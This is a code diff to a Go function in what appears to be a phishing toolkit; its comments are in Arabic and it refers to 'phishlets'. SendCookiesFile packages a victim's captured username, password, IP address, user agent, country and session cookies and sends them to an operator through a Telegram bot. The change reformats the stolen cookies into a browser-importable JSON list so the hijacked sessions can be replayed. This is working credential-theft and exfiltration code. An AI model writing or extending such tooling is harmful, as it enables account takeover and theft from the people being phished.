@@ -612,9 +612,9 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 	
 	log.Success("Cookies file sent to Telegram successfully")
 	return nil
-} 
+}
 
-func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username string, password string, remoteAddr string, userAgent string, country string, countryCode string, cookieTokens map[string]map[string]interface{}, bodyTokens map[string]string, httpTokens map[string]string) error {
+func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username string, password string, remoteAddr string, userAgent string, country string, countryCode string, cookieTokens map[string]map[string]*database.CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
 	if !t.Enabled {
 		return fmt.Errorf("بوت التليجرام غير مفعل")
 	}
@@ -622,52 +622,46 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 	log.Info("جاري تجهيز إرسال الكوكيز للجلسة: %s", sessionID)
 	
 	// تجهيز محتوى الملف
-	cookiesText := fmt.Sprintf("\n", )
-
+	cookiesList := []map[string]interface{}{} // قائمة لتخزين الكوكيز بالتنسيق المطلوب
 	
 	// معالجة توكنات الكوكيز
 	if cookieTokens == nil || len(cookieTokens) == 0 {
-		cookiesText += "=== لم يتم العثور على كوكيز ===\n\n"
+		log.Warning("لم يتم العثور على كوكيز")
 	} else {
-		cookieJSON, err := json.MarshalIndent(cookieTokens, "", "  ")
-		if err != nil {
-			log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
-			cookiesText += "خطأ في استخراج الكوكيز\n\n"
-		} else {
-			cookiesText += string(cookieJSON) + "\n\n"
-		}
-		
-		// إضافة عدد الكوكيز
-		cookiesText += "=== إحصائيات الكوكيز ===\n"
-		cookieCount := 0
-		for _, cookies := range cookieTokens {
-			cookieCount += len(cookies)
+		for domain, cookies := range cookieTokens {
+			for name, cookie := range cookies {
+				cookieData := map[string]interface{}{
+					"path":           cookie.Path,
+					"domain":         domain,
+					"expirationDate": cookie.ExpirationDate, // تأكد من أن هذا الحقل موجود في الهيكل
+					"value":          cookie.Value,
+					"name":           name,
+					"httpOnly":      cookie.HttpOnly,
+					"hostOnly":      false, // يمكنك تعديل هذا بناءً على الحاجة
+					"secure":        false, // يمكنك تعديل هذا بناءً على الحاجة
+					"session":       false, // يمكنك تعديل هذا بناءً على الحاجة
+				}
+				cookiesList = append(cookiesList, cookieData)
+			}
 		}
 	}
 	
-	// معالجة توكنات Body
-	if len(bodyTokens) > 0 {
-		cookiesText += "=== توكنات Body الخام ===\n"
-		bodyJSON, err := json.MarshalIndent(bodyTokens, "", "  ")
-		if err != nil {
-			log.Error("خطأ في تحويل توكنات Body إلى JSON: %v", err)
-		} else {
-			cookiesText += string(bodyJSON) + "\n\n"
-		}
-		cookiesText += fmt.Sprintf("إجمالي توكنات Body: %d\n\n", len(bodyTokens))
+	// تحويل قائمة الكوكيز إلى JSON
+	cookiesJSON, err := json.MarshalIndent(cookiesList, "", "  ")
+	if err != nil {
+		log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
+		return err
 	}
 	
-	// معالجة توكنات HTTP
-	if len(httpTokens) > 0 {
-		cookiesText += "=== توكنات HTTP الخام ===\n"
-		httpJSON, err := json.MarshalIndent(httpTokens, "", "  ")
-		if err != nil {
-			log.Error("خطأ في تحويل توكنات HTTP إلى JSON: %v", err)
-		} else {
-			cookiesText += string(httpJSON) + "\n\n"
-		}
-		cookiesText += fmt.Sprintf("إجمالي توكنات HTTP: %d\n", len(httpTokens))
-	}
+	// إضافة إحصائيات الكوكيز
+	cookiesText := fmt.Sprintf("=== معلومات الجلسة %s ===\n", sessionID)
+	cookiesText += fmt.Sprintf("الفيشلت: %s\n", name)
+	cookiesText += fmt.Sprintf("اسم المستخدم: %s\n", username)
+	cookiesText += fmt.Sprintf("كلمة المرور: %s\n", password)
+	cookiesText += fmt.Sprintf("عنوان IP: %s\n", remoteAddr)
+	cookiesText += fmt.Sprintf("متصفح المستخدم: %s\n", userAgent)
+	cookiesText += fmt.Sprintf("الدولة: %s (%s)\n\n", country, countryCode)
+	cookiesText += "=== الكوكيز ===\n" + string(cookiesJSON) + "\n\n"
 	
 	// إرسال الملف
 	fileName := fmt.Sprintf("cookies_%s_%s.txt", name, sessionID)
